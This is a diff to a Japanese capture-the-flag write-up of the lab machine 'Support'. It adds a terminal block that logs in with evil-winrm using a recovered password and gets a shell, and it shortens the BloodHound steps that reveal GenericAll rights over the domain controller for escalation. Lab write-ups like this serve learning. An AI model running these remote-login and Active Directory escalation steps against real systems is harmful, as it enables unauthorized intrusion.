@@ -144,7 +144,13 @@ objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
 
 ユーザ名support、パスワードIronside47pleasure40Watchfulで`evil-winrm`を実行したらユーザsupportのシェルがとれた。
 
-![usertxt](https://user-images.githubusercontent.com/85237728/194680079-a0d7880f-ce8b-407e-8baf-f57a8367a305.png)
+```
+┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
+└─$ evil-winrm --ip 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'
+...
+*Evil-WinRM* PS C:\Users\support\Documents> whoami
+support\support
+```
 
 # Adminへの権限昇格
 
@@ -157,22 +163,7 @@ bloodhoundを使う。
 
 上記コマンドにより20221009195127_XXXX.jsonという形式のjsonファイルが得られる。
 
-bloodhoundを起動するため次を実行する。
-
-```
-┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
-└─$ sudo neo4j console
-...
-```
-
-新規ターミナルで次を実行。
-
-```
-┌──(shoebill㉿shoebill)-[~/Support_10.10.11.174]
-└─$ bloodhound
-```
-
-bloodhoundの画面が立ち上がったら、ドラッグ＆ドロップで先に得られた20221009195127_XXXX.json形式のjsonファイルたちをアップロードする。
+bloodhoundを起動してこのjsonファイルたちをアップロードする。
 
 すると、ユーザsupportが属しているShared Support Accountsグループは、dc.suuport.htbに対してGenericAllであることがわかる。
 
